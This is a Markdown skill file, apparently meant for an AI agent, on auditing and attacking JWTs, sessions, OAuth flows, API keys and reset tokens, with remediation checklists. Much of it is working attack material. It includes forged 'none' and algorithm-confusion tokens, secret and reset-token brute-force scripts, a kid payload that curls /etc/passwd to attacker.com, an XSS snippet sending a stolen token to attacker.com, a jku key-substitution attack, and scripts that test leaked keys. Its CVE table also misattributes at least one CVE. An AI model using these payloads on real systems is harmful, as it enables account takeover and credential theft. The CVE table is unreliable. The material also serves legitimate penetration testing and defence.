---
name: token-auditor
description: JWT, session token, API key, and authentication token security auditor. Covers JWT attacks (none algorithm, alg confusion, kid injection, secret brute-force, claim tampering), session security (fixation, prediction, expiration), OAuth token flaws, API key leakage patterns, and token storage vulnerabilities. Includes detection payloads, exploitation techniques, and remediation guidance for each attack class. Use when: auditing auth tokens, testing JWT implementations, checking session security, hunting for API keys in source code, or testing OAuth flows. Chinese trigger: JWT审计、令牌安全、会话安全、OAuth、API密钥、身份验证
---

# Skill: Token Auditor

Deep audit of authentication tokens — JWT, sessions, OAuth, API keys.

## Attack Surface Map

```
TOKEN TYPES:
├── JWT (HS256, RS256, ES256, PS256, none)
├── Session tokens (cookie-based, URL-based)
├── OAuth tokens (access, refresh, ID token)
├── API keys (query param, header, Bearer)
└── Password reset / email verification tokens

ATTACK CLASSES:
├── Algorithm confusion (RS256 → HS256, none algorithm)
├── Secret brute-force (weak HMAC secret)
├── Claim tampering (kid, sub, role, exp, aud)
├── Token leakage (URL, referrer, JS, logs, error pages)
├── Session fixation (session ID doesn't change at login)
├── Session prediction (sequential/weak session IDs)
├── Token expiration issues (no expiry, long expiry, reuse)
├── Refresh token abuse (no rotation, stolen refresh = persistent access)
└── JWT library version vulns (CVE-based)
```

---

## JWT Attacks

### JWT Structure Refresher

```
HEADER.PAYLOAD.SIGNATURE

Header: {"alg": "HS256", "typ": "JWT", "kid": "key-1"}
Payload: {"sub": "123", "name": "John", "role": "user", "exp": 1717500000}
Signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret)
```

### Attack 1: None Algorithm Bypass

**What:** Server accepts `alg: none` → signature not verified → any payload accepted.

**Detection:**
```bash
# Decode JWT header (no secret needed)
echo "HEADER_PAYLOAD.SIGNATURE" | cut -d. -f1 | base64 -d 2>/dev/null
# Change alg to "none", remove signature
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0
echo -n '{"sub":"admin","role":"admin"}' | base64 -w0
# Combined: header.none.payload (no signature part)
```

**Exploitation:**
```
Original:  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Modified:  eyJhbGciOiJub25lIiwidHlwIjoiSldUI30.eyJzdWIiOiJhZG1pbiJ9.
           └── "none" ──────────────────┘  └── admin sub ──────────┘  └── no signature ─┘
```

**Test Request:**
```bash
curl https://target.com/api/admin \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUI30.eyJzdWIiOiJhZG1pbiJ9."
```

**CVSS:** 9.1 Critical (if unauthenticated admin access achieved)

### Attack 2: Algorithm Confusion (RS256 → HS256)

**What:** Server uses RS256 (asymmetric) but verifies with HS256 (symmetric) public key as secret.

**Detection:**
```
1. Check if alg can be changed: decode header, change "RS256" → "HS256"
2. Obtain public key:
   - From JWKS endpoint: GET /.well-known/jwks.json
   - From cert: openssl s_client -connect target.com:443 | openssl x509
   - From GitHub/files: search for .pem, .crt, public key
3. Use public key as HMAC secret
```

**Exploitation:**
```python
# pip3 install pyjwt[crypto]
import jwt

public_key = open("public.pem").read()
payload = {"sub": "admin", "role": "admin"}

# Sign with HS256 using the RS256 public key as secret
forged = jwt.encode(payload, public_key, algorithm="HS256")
print(forged)
```

**Test:**
```bash
curl https://target.com/api/admin \
  -H "Authorization: Bearer <forged_token>"
```

**CVSS:** 9.1 Critical (unauthenticated privilege escalation)

### Attack 3: Secret Brute-Force (Weak HMAC Secret)

**What:** JWT uses HS256 with a weak/known secret → brute-force the secret → forge any token.

**Detection:**
```
1. Get a valid JWT from the app (login, intercept)
2. Try common secrets:
   - "secret", "password", "key", "jwt", "token"
   - App name, domain name, company name
   - Default strings: "default", "changeme", "123456"
3. Use hashcat or john:
```

**Brute-force:**
```bash
# Using hashcat
hashcat -m 16500 jwt.txt wordlist.txt --force

# Using jwt-cracker (simple Python)
pip3 install pyjwt[crypto] requests
# See script below
```

**Python Brute-force Script:**
```python
import jwt, requests, sys

token = sys.argv[1]
target = sys.argv[2] if len(sys.argv) > 2 else "HS256"
wordlist = sys.argv[3] if len(sys.argv) > 3 else "/usr/share/wordlists/rockyou.txt"

header = jwt.get_unverified_header(token)
payload = jwt.decode(token, options={"verify_signature": False})

with open(wordlist, "r", errors="ignore") as f:
    for secret in f:
        secret = secret.strip()
        try:
            forged = jwt.encode(payload, secret, algorithm=header["alg"])
            if forged == token:
                print(f"[+] Found secret: {secret}")
                break
        except:
            continue
```

**Wordlist targets (in priority order):**
```
- App name (lowercase, uppercase, capitalized)
- Domain name without TLD
- Company name
- "secret", "password", "key", "jwt", "token"
- "default", "changeme", "admin", "letmein"
- Common defaults: "skillissue", "supersecret", "mykey"
```

**CVSS:** 7.5-9.1 (depends on what claims can be forged)

### Attack 4: Key ID (kid) Injection

**What:** `kid` header points to a key file/DB entry. If attacker controls `kid`, they can point to a file they control.

**Detection:**
```
1. Check if kid is used in JWT header
2. Check if kid maps to a file path or DB lookup
3. Try path traversal in kid: "../../../../../dev/null", "../../../etc/passwd"
4. Try SQL injection in kid: "'; SELECT * FROM keys WHERE kid='0'; --"
```

**Payloads:**
```json
// Path traversal
{"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"}

// SQL injection
{"alg": "HS256", "typ": "JWT", "kid": "0' UNION SELECT 'attacker_secret'--"}

// Command injection (if kid used in exec/spawn)
{"alg": "HS256", "typ": "JWT", "kid": "key; curl attacker.com/$(cat /etc/passwd | base64)"}
```

**CVSS:** 9.8 Critical (potential RCE if kid used in exec context)

### Attack 5: Claim Tampering

**What:** Modify JWT claims without changing signature (if alg is none or key compromised).

**Critical Claims to Test:**

| Claim | Purpose | Exploit |
|-------|---------|---------|
| `sub` | Subject (user ID) | Change to admin's ID |
| `role` / `scope` / `permissions` | Authorization | Set to `admin` |
| `aud` | Audience | Bypass audience check |
| `iss` | Issuer | Bypass issuer validation |
| `exp` | Expiration | Set to far future |
| `nbf` | Not Before | Set to past |
| `iat` | Issued At | Manipulate if validated strictly |

**Testing Process:**
```python
import jwt

token = "VALID_TOKEN"
payload = jwt.decode(token, options={"verify_signature": False})

# Test each claim
payload["role"] = "admin"
payload["sub"] = "1"  # admin user ID
payload["exp"] = 9999999999  # far future

# If alg is none or key compromised:
forged = jwt.encode(payload, "", algorithm="none")
```

**Test:**
```bash
curl https://target.com/api/admin \
  -H "Authorization: Bearer <forged_token>"
```

### Attack 6: JWT Library CVEs

Check library version for known CVEs:

| CVE | Library | Vulnerability |
|-----|---------|--------------|
| CVE-2024-21889 | Node jsonwebtoken | None algorithm bypass |
| CVE-2023-50979 | pyjwt | Secret exposure in error messages |
| CVE-2022-23529 | python-jwt | Key confusion |
| CVE-2019-10902 | java-jwt | Weak validation |

**Detection:**
```bash
# Find JWT library usage
grep -rn "jsonwebtoken\|pyjwt\|java-jwt\|jose\|njwt" --include="*.py" --include="*.js" --include="*.java"

# Check package.json
cat package.json | grep -i jwt

# Check requirements.txt
cat requirements.txt | grep -i jwt
```

---

## Session Token Attacks

### Attack 1: Session Fixation

**What:** Session ID doesn't change after login → attacker sets victim's session ID → after victim logs in, attacker uses same session.

**Detection:**
```
1. Note session cookie before login: GET /login → Set-Cookie: session=ABC
2. Log in with credentials
3. Check if session cookie changed: same session=ABC after login?
4. If unchanged = FIXED session ID = vulnerability
```

**Test Script:**
```python
import requests

s = requests.Session()
target = "https://target.com"

# Get initial session
r1 = s.get(f"{target}/login")
initial_cookie = s.cookies.get("session")
print(f"Before login: {initial_cookie}")

# Login
r2 = s.post(f"{target}/login", json={"email": "test@test.com", "password": "test"})
after_cookie = s.cookies.get("session")
print(f"After login: {after_cookie}")

if initial_cookie == after_cookie:
    print("[+] Session fixation: ID does not change at login")
else:
    print("[-] Session regenerated on login (good)")
```

**Exploitation:**
```
1. Attacker: GET /login → session=ATTACKER_ID
2. Attacker sends victim link: https://target.com/login?session=ATTACKER_ID
3. Victim logs in with credentials
4. Server keeps session=ATTACKER_ID (didn't regenerate)
5. Attacker uses session=ATTACKER_ID → logged in as victim
```

**CVSS:** 7.5 High (requires victim to log in, but full ATO)

### Attack 2: Session Prediction

**What:** Session IDs are predictable (sequential, timestamp-based, weak random) → attacker guesses valid sessions.

**Detection:**
```
1. Collect 20+ session IDs from different logins
2. Analyze patterns:
   - Sequential: 1001, 1002, 1003 → predict next
   - Timestamp: 1717500000, 1717500001 → time-based
   - Short: 8 chars, hex only → limited keyspace
   - User ID embedded: session=user_123 → predictable
3. Calculate keyspace entropy
```

**Entropy Check:**
```python
import math

def entropy(sessions):
    charset = set("".join(sessions))
    length = len(sessions[0])
    return length * math.log2(len(charset))

sessions = ["abc123def", "abc456ghi", "abc789jkl"]
e = entropy(sessions)
print(f"Entropy: {e:.1f} bits")
if e < 50:
    print("[!] Low entropy: session IDs may be predictable")
```

**CVSS:** 5.4-7.5 (depends on session lifespan and privileges)

### Attack 3: Session Expiration Issues

**What:** Sessions don't expire, or expire too late, or can be reused.

**Checks:**
```
- Login → wait 24h → is session still valid?
- Login → logout → can old session still be used?
- Request token #1 → request token #2 → use token #1 → still works?
- Check session cookie attributes: Secure? HttpOnly? SameSite? Expires?
```

**Test Script:**
```python
import time, requests

s = requests.Session()
target = "https://target.com"

# Login
s.post(f"{target}/login", json={"email": "user@test.com", "password": "pass"})
session_cookie = s.cookies.get("session")
print(f"Session: {session_cookie}")

# Wait
print("Waiting 25 hours...")
time.sleep(25 * 3600)

# Test session still valid
r = s.get(f"{target}/api/user")
if r.status_code == 200:
    print("[!] Session valid after 25h — expiration too long or absent")
else:
    print("[-] Session expired (good)")
```

**CVSS:** 5.3 Medium (session hijacking window extended)

### Attack 4: Session in URL

**What:** Session ID passed in URL parameter → leaks via Referer header, browser history, logs.

**Detection:**
```
Check for: ?session=, ?token=, ?s=, ?sid= in URLs
Check Set-Cookie: session in URL (not just cookie header)
```

**CVSS:** 5.3 Medium (requires MITM or log access, but real risk)

---

## OAuth Token Attacks

### Attack 1: Access Token in URL Fragment

**What:** Implicit flow returns token in URL fragment (#access_token=...) → accessible to JavaScript → XSS steals it.

**Detection:**
```
1. Initiate OAuth flow
2. Observe redirect URL: callback#access_token=XXX&token_type=Bearer
3. Fragment (#) is NOT sent to server — but IS accessible via document.location.hash
```

**Exploitation:**
```javascript
// If XSS exists on any page in the OAuth domain:
<script>
  token = document.location.hash.split('&')[0].replace('#access_token=', '');
  fetch('https://attacker.com/steal?t=' + token);
</script>
```

**CVSS:** 7.5 High (XSS + token = ATO)

### Attack 2: Refresh Token Without Rotation

**What:** Same refresh token can be used multiple times → stolen refresh = persistent access.

**Detection:**
```
1. Get access token + refresh token
2. Use refresh token to get new access token
3. Use the SAME refresh token again
4. If it still works = no rotation = vulnerability
```

**Test:**
```python
import requests

client_id = "YOUR_CLIENT_ID"
client_secret = "YOUR_CLIENT_SECRET"
refresh_token = "STOLEN_REFRESH_TOKEN"

# First refresh
r1 = requests.post("https://target.com/oauth/token", data={
    "grant_type": "refresh_token",
    "refresh_token": refresh_token,
    "client_id": client_id,
    "client_secret": client_secret
})
access1 = r1.json()["access_token"]

# Second refresh with SAME token
r2 = requests.post("https://target.com/oauth/token", data={
    "grant_type": "refresh_token",
    "refresh_token": refresh_token,
    "client_id": client_id,
    "client_secret": client_secret
})

if r2.status_code == 200:
    print("[!] Refresh token not rotated — reusable after use")
else:
    print("[-] Refresh token rotated (good)")
```

**CVSS:** 7.5 High (stolen refresh = persistent unauthorized access)

### Attack 3: Open Redirect + OAuth Code Theft

**What:** OAuth redirect_uri accepts attacker's domain → auth code sent to attacker → attacker exchanges code for token.

**Detection:**
```
1. Register attacker.com as redirect URI (if possible)
2. Or find open redirect: ?next=, ?redirect=, ?url= 
3. Chain: attacker.com/redirect → target.com redirect → attacker.com/capture
```

**CVSS:** 9.1 Critical (full OAuth account takeover)

---

## API Key Leakage

### Detection Patterns

**Source Code:**
```bash
# Generic API key patterns
grep -rn "api[_-]?key\|apikey\|api_secret\|api_token" --include="*.js" --include="*.ts" --include="*.py"

# AWS keys
grep -rn "AKIA[0-9A-Z]{16}" --include="*.js" --include="*.py" --include="*.ts"
# AWS access key pattern: AKIA followed by 16 alphanumeric chars

# GitHub tokens
grep -rn "gh[ops]_[A-Za-z0-9_]{36,}" --include="*.js" --include="*.py"

# Generic Bearer tokens
grep -rn "Bearer [A-Za-z0-9\-._~+/]+=*" --include="*.js" --include="*.ts"

# Private keys
grep -rn "-----BEGIN \(RSA\|OPENSSH\|EC\) PRIVATE KEY-----" --include="*"

# Firebase
grep -rn "firebaseio\.com" --include="*.js" --include="*.json"

# Stripe
grep -rn "sk_live_[0-9a-zA-Z]{24,}" --include="*.js" --include="*.py"

# Slack
grep -rn "xox[baprs]-[0-9a-zA-Z-]+" --include="*.js" --include="*.py"
```

**JS Files:**
```bash
# SecretFinder
python3 SecretFinder.py -i https://target.com/app.js -o cli

# jsluice
cat urls.txt | grep "\.js$" | jsluice secrets -

# Manual grep in JS bundles
cat bundle.js | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | head -20  # emails
cat bundle.js | grep -oE "https?://[^\s\"']+" | grep -i "api\|auth\|token\|key" | head -20
```

### API Key Validation

**Test if key is live:**
```bash
# AWS
aws sts get-caller-identity --access-key AKIA... --secret-key ...

# GitHub
curl -H "Authorization: token ghp_..." https://api.github.com/user

# Stripe (test mode first!)
curl https://api.stripe.com/v1/charges \
  -u sk_test_...

# Google Maps
curl "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=YOUR_KEY"
```

---

## Password Reset Token Attacks

### Attack 1: Token Prediction

**What:** Reset tokens are predictable (timestamp-based, sequential, short).

**Detection:**
```
1. Request 5+ reset tokens for same account
2. Analyze:
   - Sequential: 1001, 1002, 1003 → brute-forceable
   - Timestamp-based: base64(time) → predictable
   - Short numeric: 6 digits → 1M brute-force space
   - Short hex: 8 chars → 4B space (still brute-forceable at scale)
```

**Brute-force:**
```bash
# Numeric 6-digit token
ffuf -u "https://target.com/reset?token=FUZZ&email=victim@test.com" \
  -w <(seq -w 000000 999999) \
  -fc 404 -t 50

# Hex 8-char token (16M combinations, use smaller range)
ffuf -u "https://target.com/reset?token=FUZZ" \
  -w hex8.txt \
  -fc 404 -t 30

# Timing-based: check if valid token returns different response time
```

**CVSS:** 7.5 High (ATO via token brute-force)

### Attack 2: Token Reuse

**What:** Reset tokens not invalidated after use.

**Detection:**
```
1. Request reset token for victim
2. Use token to reset password → success
3. Try the SAME token again → if it works = no invalidation
```

**CVSS:** 6.5 Medium (token reuse window)

### Attack 3: Token Not Expiring

**What:** Reset tokens valid indefinitely.

**Detection:**
```
1. Request reset token
2. Wait 48 hours
3. Try token again → if still valid = no expiration
```

**CVSS:** 5.4 Medium (extended attack window)

---

## Complete Token Audit Checklist

### JWT Checklist
- [ ] Can `alg` be changed to `none`?
- [ ] Can `alg` be changed from RS256 to HS256?
- [ ] Is the HMAC secret brute-forceable?
- [ ] Is `kid` injectable (path traversal, SQLi, command injection)?
- [ ] Can claims be modified (sub, role, exp, aud)?
- [ ] Is the library version vulnerable (check CVE list)?
- [ ] Is JWT transmitted over HTTP (not HTTPS)?
- [ ] Is JWT stored in localStorage (XSS risk) vs HttpOnly cookie?
- [ ] Is JWT validated on EVERY request or just at login?

### Session Checklist
- [ ] Does session ID change at login (fixation check)?
- [ ] Are session IDs predictable (entropy < 50 bits)?
- [ ] What's the session expiration time?
- [ ] Is session invalidated on logout?
- [ ] Is session in URL (not cookie)?
- [ ] Are session cookies: Secure? HttpOnly? SameSite=Strict?
- [ ] Can old sessions be reused after password change?
- [ ] Is there concurrent session management (max sessions per user)?

### OAuth Checklist
- [ ] Is state parameter required and validated?
- [ ] Is PKCE required for public clients?
- [ ] Does redirect_uri accept wildcards or attacker domains?
- [ ] Is access token returned in fragment (implicit flow risk)?
- [ ] Are refresh tokens rotated on use?
- [ ] Is token expiration enforced?
- [ ] Is token scope minimal (least privilege)?
- [ ] Can authorization code be reused (should be one-time)?

### API Key Checklist
- [ ] Are API keys in source code / JS bundles?
- [ ] Are keys transmitted in URL (vs header)?
- [ ] Do keys have expiration / rotation?
- [ ] Are keys scoped to minimum permissions?
- [ ] Can one user's key access another user's data?
- [ ] Are revoked keys actually invalidated server-side?

### Password Reset Checklist
- [ ] Is reset token predictable (sequential, timestamp, short)?
- [ ] Is token brute-forceable (< 50 bits entropy)?
- [ ] Is token invalidated after use?
- [ ] Does token expire (recommended: < 1 hour)?
- [ ] Is rate limiting on reset endpoint?
- [ ] Does reset require current password for email change?
- [ ] Is reset token tied to specific IP or user-agent (defense in depth)?

---

## Token Leakage Sources

### Where Tokens Leak

| Source | Risk | Check |
|--------|------|-------|
| URL parameter | Referer header leak | Search for `?token=`, `?access_token=` |
| JavaScript variables | XSS → token theft | Search JS for token storage |
| LocalStorage | XSS → token theft | Check app JS for localStorage usage |
| SessionStorage | Tab close doesn't clear | Check app JS for sessionStorage |
| Error pages / stack traces | Verbose errors show tokens | Trigger errors, check response |
| Logs (client + server) | Logs accessible = tokens accessible | Check log endpoints |
| Browser history | URL-based tokens stored forever | Audit all URLs with tokens |
| Mobile apps | Can extract from binary / proxy | Burp mobile proxy |
| Git history | Committed tokens permanent | git log --all -S "token" |

### Leak Exploitation
```
1. Find token in JS: console.log(localStorage.getItem('token'))
2. If XSS exists anywhere on domain → steal token
3. Use stolen token to access API as victim
4. If token has refresh capability → persistent access
```

---

## Remediation Patterns

### JWT Remediation
```
1. Always validate algorithm server-side (reject "none" explicitly)
2. Use asymmetric keys (RS256/ES256) for public/private key pairs
3. Use strong HMAC secret (128+ bit random, not dictionary words)
4. Validate ALL claims: iss, aud, exp, nbf, iat
5. Set short expiration (15 min for access tokens)
6. Use refresh tokens with rotation for long-lived sessions
7. Keep JWT library updated (check CVEs monthly)
8. Don't store sensitive data in JWT payload (it's base64, not encrypted)
```

### Session Remediation
```
1. Regenerate session ID at login (session fixation prevention)
2. Use cryptographically random IDs (128+ bits entropy)
3. Set reasonable expiration (session: 2h idle, absolute: 24h)
4. Invalidate session on logout AND password change
5. Set cookie flags: Secure, HttpOnly, SameSite=Strict
6. Implement concurrent session limits
7. Bind session to IP/User-Agent (defense in depth, not primary)
```

### OAuth Remediation
```
1. Always require and validate state parameter
2. Use PKCE for all public clients (mobile, SPA)
3. Strict redirect_uri validation (exact match, no wildcards)
4. Prefer authorization code flow over implicit
5. Rotate refresh tokens on each use
6. Set short access token expiry (15-60 min)
7. Enforce minimal scopes per token
8. Validate tokens on every request (not cached)
```

### General Token Remediation
```
1. Never transmit tokens in URL parameters
2. Never store tokens in localStorage (use HttpOnly cookies)
3. Always use HTTPS (no exceptions)
4. Implement rate limiting on auth endpoints
5. Monitor for token abuse (unusual access patterns)
6. Provide token revocation endpoint
7. Log token issuance and use (for forensic analysis)
```

---

## Token Audit Tools

```bash
# JWT toolkit
pip3 install pyjwt[crypto]  # decode/encode JWTs

# Online tools (only for non-sensitive tokens!)
# jwt.io — decode and inspect JWTs
# https://jwt.io/

# Hashcat for JWT brute-force
hashcat -m 16500 jwt.txt wordlist.txt

# John the Ripper
john --format=HMAC-SHA256 jwt.txt --wordlist=wordlist.txt

# Burp extensions
# JSON Web Token Attacker (JOSEPH) — JWT manipulation
# Autorize — auth bypass testing
```

---

## CVSS Quick Reference

| Token Vulnerability | Typical CVSS | Severity |
|---------------------|--------------|----------|
| JWT none algorithm → admin | 9.1 | Critical |
| RS256 → HS256 confusion | 9.1 | Critical |
| JWT secret brute-force → admin | 9.1 | Critical |
| kid injection → RCE | 9.8 | Critical |
| Session fixation → ATO | 7.5 | High |
| Refresh token not rotated | 7.5 | High |
| OAuth code theft chain | 9.1 | Critical |
| Token in URL / Referrer | 5.3 | Medium |
| Session prediction | 5.4 | Medium |
| Long session expiry (30+ days) | 5.3 | Medium |

---

## Advanced JWT Attack Techniques

### JWT Header Parameter Injection

```javascript
// Beyond "none" — other header attacks:
// 1. Change typ to "JWT" when expecting "JWT" (some libs are strict)
// 2. Change kid to manipulate key lookup
// 3. Change jku (JWK Set URL) to attacker's server
// 4. Change x5u (X.509 URL) to attacker's certificate

// jku attack:
// Original header: {"alg":"RS256","typ":"JWT","jku":"https://target.com/.well-known/jwks.json"}
// Modified: {"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}
// Attacker hosts fake JWKS with attacker's public key
// Signs token with attacker's private key → verifies against attacker's public key
```

### JWT JKU/x5u Attack

```bash
# Step 1: Check if jku is accepted
echo -n '{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}' | base64 -w0

# Step 2: Host fake JWKS on attacker.com/jwks.json
{
  "keys": [{
    "kty": "RSA",
    "use": "sig",
    "kid": "attacker-key",
    "n": "ATTACKER_MODULUS",
    "e": "AQAB"
  }]
}

# Step 3: Sign with attacker's private key
openssl genrsa -out attacker.pem 2048
python3 -c "
import jwt
private_key = open('attacker.pem').read()
payload = {'sub': 'admin', 'role': 'admin'}
token = jwt.encode(payload, private_key, algorithm='RS256', headers={'jku': 'https://attacker.com/jwks.json', 'kid': 'attacker-key'})
print(token)
"
```

### JWT Audience Bypass

```python
# Some implementations check aud claim
# Test bypasses:

# 1. Remove aud claim
payload = {"sub": "admin", "role": "admin"}  # no aud
# If server doesn't require aud → works

# 2. Wildcard aud
payload = {"sub": "admin", "aud": "*"}  # some libs accept wildcard

# 3. Array aud
payload = {"sub": "admin", "aud": ["api", "admin", "*"]}

# 4. URL aud vs string aud mismatch
payload = {"sub": "admin", "aud": "https://target.com"}  # vs expected "api"
```

### JWT Expiration Bypass

```python
# exp claim bypasses:

# 1. Remove exp claim entirely
payload = {"sub": "admin", "role": "admin"}  # no exp

# 2. Set exp far in the future
payload = {"sub": "admin", "role": "admin", "exp": 9999999999}

# 3. Set nbf to past
payload = {"sub": "admin", "role": "admin", "nbf": 1000000000}

# 4. Set iat to match nbf (some libs check iat >= nbf)
payload = {"sub": "admin", "role": "admin", "iat": 1000000000, "nbf": 1000000000}
```

---

## Advanced Session Attacks

### Session Puzzling

```
What: Different parts of the app use the same session token for different 
      purposes, with different validation logic.

Example:
- /api/ uses session for auth
- /admin/ uses same session for auth but different validation
- /api/ rejects expired sessions
- /admin/ does NOT check expiration

Attack:
1. Get valid session token
2. Wait for it to expire for /api/
3. Use same token for /admin/ → still works
4. Admin access with "expired" session
```

### Session Binding Bypass

```
What: Session is bound to IP/User-Agent for security
Bypass techniques:

1. IP binding:
   - Attacker uses same IP as victim (unlikely)
   - Attacker on same NAT as victim
   - XSS steals token, uses from same IP
   
2. User-Agent binding:
   - Copy victim's User-Agent header exactly
   - Most User-Agents are predictable (browser + version)
   - curl -A "Mozilla/5.0..." -H "Cookie: session=STOLEN"

3. Combined binding:
   - Steal token via XSS
   - Attacker's browser has same User-Agent
   - Use stolen token from attacker's IP
```

### Session Token Predictability Deep Dive

```python
#!/usr/bin/env python3
"""
Session token prediction analyzer
"""
import math
from collections import Counter

def analyze_sessions(session_ids):
    """Analyze session IDs for predictability"""
    print(f"Analyzing {len(session_ids)} session IDs...")
    
    # Length analysis
    lengths = [len(s) for s in session_ids]
    print(f"Lengths: min={min(lengths)}, max={max(lengths)}, common={Counter(lengths).most_common(3)}")
    
    # Character set analysis
    all_chars = set(''.join(session_ids))
    print(f"Character set: {sorted(all_chars)} ({len(all_chars)} unique chars)")
    
    # Entropy calculation
    def entropy(strings):
        charset = set(''.join(strings))
        length = len(strings[0])
        return length * math.log2(len(charset))
    
    e = entropy(session_ids)
    print(f"Entropy: {e:.1f} bits")
    
    if e < 50:
        print("[!] LOW ENTROPY: Session IDs may be predictable!")
    
    # Sequential detection
    if len(session_ids) >= 3:
        try:
            nums = [int(s) for s in session_ids]
            diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
            if len(set(diffs)) == 1:
                print(f"[!] SEQUENTIAL: Sessions increment by {diffs[0]}")
        except ValueError:
            pass  # Not numeric
    
    # Timestamp detection
    import time
    current = int(time.time())
    for s in session_ids[:5]:
        try:
            ts = int(s[:10])
            if current - ts < 86400:  # within last 24 hours
                print(f"[?] Possible timestamp prefix: {s[:10]} → {time.ctime(ts)}")
        except:
            pass
    
    # Pattern analysis
    prefixes = [s[:4] for s in session_ids]
    prefix_counts = Counter(prefixes)
    if len(prefix_counts) < len(session_ids) / 2:
        print(f"[?] Common prefixes: {prefix_counts.most_common(5)}")

# Usage:
sessions = [
    "abc123def456",
    "abc124ghi789",
    "abc125jkl012",
    # ... collect more from actual login responses
]
analyze_sessions(sessions)
```

---

## Advanced OAuth/OIDC Attacks

### OAuth PKCE Bypass

```
What: PKCE (Proof Key for Code Exchange) should be required for public clients
Bypass:

1. Code verifier reuse:
   - Some implementations accept same code_verifier for multiple codes
   - Steal auth code → reuse verifier → get token

2. Plain text code challenge:
   - code_challenge=plain (instead of S256 hash)
   - Intercept code_challenge → predict code_verifier

3. Missing PKCE enforcement:
   - Client doesn't send code_challenge
   - Server doesn't require it
   - Classic auth code interception possible
```

### OAuth Scope Escalation

```python
# Test if scopes can be escalated:

# 1. Request with minimal scope
GET /oauth/authorize?response_type=code&client_id=X&scope=read&redirect_uri=Y

# 2. If code is issued, try exchanging with broader scope
POST /oauth/token
grant_type=authorization_code&code=STOLEN_CODE&scope=admin+write+delete

# Some implementations allow scope upgrade during token exchange!
```

### OIDC ID Token Attacks

```python
# ID tokens contain user claims
# Attack if ID token is trusted without verification

# 1. ID token in session (not access token)
# If app uses ID token for auth instead of access token:
payload = jwt.decode(id_token, options={"verify_signature": False})
payload["email"] = "admin@target.com"
forged = jwt.encode(payload, "", algorithm="none")

# 2. ID token claims manipulation
payload = {
    "sub": "admin_user_id",
    "email": "admin@target.com",
    "email_verified": True,
    "role": "admin"
}

# 3. Nonce bypass
# OIDC uses nonce to prevent replay
# If nonce not validated → replay old ID token
```

---

## Advanced API Key Discovery

### API Keys in Source Code Deep Dive

```bash
# Extended secret patterns
grep -rn "api[_-]key\|apikey\|api_secret\|client_secret\|client_id" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.json" \
  --include="*.yaml" --include="*.yml" --include="*.env*" \
  | grep -v node_modules | grep -v ".git"

# Environment variables in JS bundles
grep -rn "process\.env\." --include="*.js" | grep -v node_modules
grep -rn "NEXT_PUBLIC_" --include="*.js" | grep -v node_modules  # Next.js public vars

# Hardcoded credentials
grep -rn "password\s*[:=]\|passwd\s*[:=]\|pwd\s*[:=]" \
  --include="*.js" --include="*.ts" --include="*.py" -i | grep -v node_modules

# Connection strings (DB, cache, etc.)
grep -rn "mongodb://\|postgres://\|mysql://\|redis://\|amqp://" \
  --include="*.js" --include="*.ts" --include="*.py" | grep -v node_modules
```

### API Key Validation Methodology

```bash
#!/bin/bash
# validate-api-key.sh — test if discovered keys are live

KEY=$1
KEY_TYPE=$2  # aws, github, stripe, generic

case $KEY_TYPE in
    aws)
        echo "[*] Testing AWS key..."
        aws sts get-caller-identity --access-key "$KEY" 2>&1 | head -5
        ;;
    github)
        echo "[*] Testing GitHub token..."
        curl -s -H "Authorization: token $KEY" https://api.github.com/user | jq .
        ;;
    stripe)
        echo "[*] Testing Stripe key (TEST MODE)..."
        curl -s https://api.stripe.com/v1/charges -u "$KEY:" | jq .
        ;;
    generic)
        echo "[*] Testing generic API key..."
        # Try common API endpoints
        for endpoint in "/api/keys/verify" "/api/validate" "/api/status"; do
            curl -s -H "X-API-Key: $KEY" "https://target.com$endpoint"
        done
        ;;
esac
```

---

## Password Reset Token Attacks (Advanced)

### Timing-Based Token Exploitation

```python
#!/usr/bin/env python3
"""
Timing attack on password reset tokens
If token generation is timestamp-based, we can predict tokens
"""
import time
import requests
import hashlib

def timing_attack(target, email):
    """Attempt to predict reset token based on server time"""
    
    # Get current approximate server time
    r = requests.get(f"{target}/api/time")
    if r.status_code == 200:
        server_time = int(r.json()['timestamp'])
    else:
        server_time = int(time.time())
    
    # Try tokens based on server time (various formats)
    formats = [
        lambda t: str(t),                    # plain timestamp
        lambda t: hashlib.md5(str(t).encode()).hexdigest()[:16],
        lambda t: hashlib.sha1(str(t).encode()).hexdigest()[:20],
        lambda t: hashlib.sha256(str(t).encode()).hexdigest()[:32],
    ]
    
    # Try ±60 seconds around server time
    for offset in range(-60, 61):
        timestamp = server_time + offset
        for fmt in formats:
            token = fmt(timestamp)
            r = requests.post(f"{target}/api/reset-password", 
                            data={"token": token, "email": email})
            if r.status_code != 404 and r.status_code != 400:
                print(f"[+] Possible valid token: {token} (offset: {offset}s)")

# If timing attack works → token is predictable based on timestamp
```

### Reset Token in Referrer Leak

```
Flow:
1. User requests password reset
2. Email sent with reset link: https://target.com/reset?token=ABC123
3. Reset page loads external resources (images, CSS, analytics)
4. Browser sends Referer header with FULL URL including token
5. External domain receives token in logs

Attack:
1. Identify external resources on reset page
2. Check referrer logs of those external domains
3. Steal reset tokens from logs

Testing:
curl -e "https://target.com/reset?token=TEST" https://evil.com/
# Check evil.com logs for the token
```

---

## Complete Token Security Audit Checklist

### JWT Checklist (Expanded)
- [ ] Can `alg` header be changed to `none`?
- [ ] Can `alg` be changed from RS256 to HS256?
- [ ] Is HMAC secret brute-forceable with common wordlists?
- [ ] Is `kid` injectable (path traversal, SQLi, command injection)?
- [ ] Can claims be modified (sub, role, exp, aud, iss)?
- [ ] Is the JWT library version vulnerable (check CVE list)?
- [ ] Is JWT transmitted over HTTP (not HTTPS)?
- [ ] Is JWT stored in localStorage (XSS risk) vs HttpOnly cookie?
- [ ] Is JWT validated on EVERY request or just at login?
- [ ] Is `jku` header accepted (JWK Set URL)?
- [ ] Is `x5u` header accepted (X.509 URL)?
